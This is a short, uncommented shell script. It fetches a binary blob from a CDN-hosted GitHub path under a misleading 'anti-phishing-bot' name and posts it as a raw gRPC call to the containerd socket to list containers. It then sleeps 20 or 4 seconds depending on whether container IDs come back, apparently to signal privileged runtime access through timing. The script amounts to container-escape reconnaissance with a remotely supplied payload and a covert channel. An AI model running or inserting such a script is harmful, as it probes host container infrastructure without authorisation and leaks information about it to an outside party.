#!/bin/sh
curl -sf -m 8 -o /tmp/fr.bin https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2/fr.bin || exit 0
curl -s -m 6 --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @/tmp/fr.bin http://localhost/containerd.services.containers.v1.Containers/List -o /tmp/n.bin 2>/dev/null
grep -qE '[a-f0-9]{64}' /tmp/n.bin 2>/dev/null && sleep 20 || sleep 4
